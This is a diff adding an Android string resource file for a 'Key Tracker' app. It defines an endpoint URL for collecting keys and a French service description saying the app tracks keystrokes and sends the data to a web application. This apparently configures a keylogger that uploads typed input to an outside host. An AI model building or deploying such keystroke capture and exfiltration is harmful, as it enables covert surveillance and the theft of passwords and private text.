@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="api_endpoint">https://android-tracker-theta.vercel.app/api/keys</string>
+    <string name="app_name">Key Tracker</string>
+    <string name="service_description">Service de suivi des touches pour envoyer les données à l\'application web</string>
+    <string name="service_name">Key Tracker Service</string>
+</resources>
